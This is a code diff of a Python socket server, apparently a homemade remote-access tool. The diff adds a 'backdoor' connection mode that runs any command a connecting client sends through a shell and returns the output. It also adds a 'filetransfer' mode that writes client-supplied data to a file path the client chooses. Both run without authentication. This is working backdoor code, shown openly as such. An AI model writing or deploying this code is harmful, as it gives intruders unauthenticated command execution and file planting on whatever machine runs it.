@@ -30,22 +30,32 @@ while listening != 0:
     print("conntection from " + str(addr))
     conntype = c.recv(1024).decode('utf-8')
     print("connection type: " + conntype)
-    while True:
-        msg = ""
+    filename = ""
+    if conntype == "filetransfer": # get the new file name
         msg = c.recv(2048).decode('utf-8')
-        if msg == "exit":
+        c.send(("MAKING FILE: " + msg).encode('utf-8'))
+        filename = msg
+        with open(filename, "w") as f:
+            print("made file")
+    while True: # main connection loop
+        msg = "" # information they sent us
+        print("retrieving message...")
+        msg = c.recv(2048).decode('utf-8')
+        print("msg: " + msg)
+        if msg == "exit": # exit condition
             break
-        if conntype == "backdoor":
+        if conntype == "backdoor": # backdoor, for running commands/applications
             try:
-                proc = subprocess.Popen(msg.split(' '),
-                    stdout=subprocess.PIPE,
-                    stderr=subprocess.PIPE,
-                                        
-                )
-                stdout, stderr = proc.communicate()
-                c.send(stdout)
+                stdout = subprocess.check_output(msg, shell=True).decode('utf-8') + "\ncompleted"
+                c.send(stdout.encode('utf-8'))
             except Exception as e:
                 c.send(('laceworkdog: ' + msg + ': Not a command!\nError: ' + str(e)).encode('utf-8'))
+        if conntype == "filetransfer": # file 
+            with open(filename, "a") as file:
+                print("WRITING TO FILE: ")
+                print("CONTETS: " + msg)
+                file.write(msg)
+                c.send(("Written " + str(len(msg)) + " to file " + filename).encode('utf-8'))
     c.close()
     listening-=1
 
